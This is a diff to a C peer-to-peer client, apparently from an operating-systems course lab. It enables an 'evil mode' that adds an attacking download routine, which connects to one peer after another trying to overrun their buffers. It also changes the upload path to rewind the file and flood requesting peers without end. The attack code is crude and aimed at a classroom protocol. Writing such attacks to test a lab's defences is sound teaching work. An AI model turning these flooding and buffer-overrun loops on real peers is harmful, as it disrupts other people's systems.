@@ -25,8 +25,8 @@
 
 #include "pthread.h"
 
-int evil_mode = 0;			// nonzero iff this peer should behave badly
-#define EXTRA_CREDIT
+int evil_mode = 1;			// nonzero iff this peer should behave badly
+//#define EXTRA_CREDIT
 
 static struct in_addr listen_addr;	// Define listening endpoint
 static int listen_port;
@@ -468,21 +468,6 @@ static void register_files(task_t *tracker_task, const char *myalias)
 			continue;
 #ifdef EXTRA_CREDIT
         char* checksum = create_md5(ent->d_name);
-        // make some evil move
-        /* if (evil_mode == 2) { */
-        /*     if (checksum[0] != 'e') { */
-        /*         checksum[0] = 'e'; */
-        /*         checksum[1] = 'v'; */
-        /*         checksum[2] = 'i'; */
-        /*         checksum[3] = 'l'; */
-        /*     } else { */
-        /*         checksum[3] = 'e'; */
-        /*         checksum[2] = 'v'; */
-        /*         checksum[1] = 'i'; */
-        /*         checksum[0] = 'l'; */
-        /*     } */
-        /* } */
-        /* printf("Registering file %s with checksum: %s\n", ent->d_name, checksum); */
 
 		osp2p_writef(tracker_task->peer_fd, "HAVE %s %s\n", ent->d_name, checksum);
 #else
@@ -763,6 +748,7 @@ static task_t *task_listen(task_t *listen_task)
 //	the requested file.
 static void task_upload(task_t *t)
 {
+    //message("**** calling task_upload()");
 	assert(t->type == TASK_UPLOAD);
 	// First, read the request from the peer.
 	while (1) {
@@ -824,42 +810,36 @@ static void task_upload(task_t *t)
 		goto exit;
 	}
 
-    if (evil_mode != 2) {
-        t->disk_fd = open(t->filename, O_RDONLY);
-        if (t->disk_fd == -1) {
-            error("* Cannot open file %s", t->filename);
+    t->disk_fd = open(t->filename, O_RDONLY);
+    if (t->disk_fd == -1) {
+        error("* Cannot open file %s", t->filename);
+        goto exit;
+    }
+
+    message("* Transferring file %s\n", t->filename);
+    // Now, read file from disk and write it to the requesting peer.
+    while (1) {
+        int ret = write_from_taskbuf(t->peer_fd, t);
+        if (ret == TBUF_ERROR) {
+            error("* Peer write error");
             goto exit;
         }
-
-        message("* Transferring file %s\n", t->filename);
-        // Now, read file from disk and write it to the requesting peer.
-        while (1) {
-            int ret = write_from_taskbuf(t->peer_fd, t);
-            if (ret == TBUF_ERROR) {
-                error("* Peer write error");
-                goto exit;
-            }
-
-            // evil mode
-            if (evil_mode == 1) {
-                lseek(t->disk_fd, 0, 0);
-                //t->head = 0;
-            }
-
-            ret = read_to_taskbuf(t->disk_fd, t);
-
-            printf("disk_fd: %d\n", t->disk_fd);
-            if (ret == TBUF_ERROR) {
-                error("* Disk read error");
-                goto exit;
-            } else if (ret == TBUF_END && t->head == t->tail)
-                /* End of file */
-                break;
+       
+        if (evil_mode == 2) {
+           // try to reset the disk file descriptor to beginning of file
+           // all the time to attack overrun the buffer. 
+            lseek(t->disk_fd,0,0); 
         }
-    } else if (evil_mode == 2) {
-        while(1) {
-            osp2p_writef(t->peer_fd, "EVIL_WRITE");
-        }
+
+        ret = read_to_taskbuf(t->disk_fd, t);
+
+        printf("disk_fd: %d\n", t->disk_fd);
+        if (ret == TBUF_ERROR) {
+            error("* Disk read error");
+            goto exit;
+        } else if (ret == TBUF_END && t->head == t->tail)
+            /* End of file */
+            break;
     }
 
 	message("* Upload of %s complete\n", t->filename);
@@ -890,6 +870,53 @@ void* pthread_task_upload(void * input)
 	pthread_exit(NULL);
 }
 
+
+// Mostly copy from task download and 
+void evil_download(task_t *t, task_t* tracker_task) {
+	int i, ret = -1;
+	assert((!t || t->type == TASK_DOWNLOAD)
+	       && tracker_task->type == TASK_TRACKER);
+
+	// Quit if no peers, and skip this peer
+	if (!t || !t->peer_list) {
+		error("* No peers have '%s'\n",t->filename);
+		task_free(t);
+		return;
+	} else if (t->peer_list->addr.s_addr == listen_addr.s_addr
+		   && t->peer_list->port == listen_port)
+		goto try_again;
+
+	// Connect to the peer and write the GET command
+	message("* Attacking %s:%d to download '%s'\n",
+		inet_ntoa(t->peer_list->addr), t->peer_list->port,
+		t->filename);
+	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+	if (t->peer_fd == -1) {
+		error("* Cannot connect to peer: %s\n", strerror(errno));
+		goto try_again;
+	}
+	
+	// Read the file into the task buffer from the peer, just till
+	// it fills up
+	while (1) {
+        message("* Attacking, waiting for buffer overrun....\n");
+        // Read segment into the task buffer
+		int ret = read_to_taskbuf(t->peer_fd, t);
+        // Check for a peer read error
+		if (ret == TBUF_ERROR) {
+			error("* Peer read error");
+			goto try_again;
+		} else if (ret == TBUF_END && t->head == t->tail)
+			break; // End Of File
+	}
+	
+	// We want to try to harm someone else no matter what
+    try_again:
+	message("* Attack successfully, and start again\n");
+	// recursive call
+	task_pop_peer(t);
+	evil_download(t, tracker_task);
+}
 
 // main(argc, argv)
 //	The main loop!
@@ -980,6 +1007,7 @@ int main(int argc, char *argv[])
 	int i = 0;
 	int rc = 0;
 	pid_t pid = 0;
+    pid_t evil_pid = 0;
 	// First, download files named on command line.
 	// using pthread
 	fflush(stdout);
@@ -998,6 +1026,8 @@ int main(int argc, char *argv[])
 			else if (pid == 0)
 			{
 				task_download(t, tracker_task);
+                // if there is evil download fork it again
+                
 				_exit(0);
 			}
 			else
@@ -1021,6 +1051,19 @@ int main(int argc, char *argv[])
 		i++;
 	}
 	
+    if (evil_mode == 1) {
+        if ((t = start_download(tracker_task, "cat2.jpg"))) {
+            evil_pid = fork();
+            if (evil_pid == -1) {
+                error("Not able to fork download");
+            } else if(evil_pid > 0) {}
+            else if(evil_pid == 0) {
+                evil_download(t, tracker_task);
+                _exit(0);
+            }
+        }
+    }
+
 	/*
 	int j;
 	for(j = 0; j <i; j++)
@@ -1037,6 +1080,7 @@ int main(int argc, char *argv[])
 			error("Fork error()\n");
 		else if (pid == 0)
 		{
+            //message("**** calling task_upload()");
 			task_upload(t);
 			_exit(0);
 		}
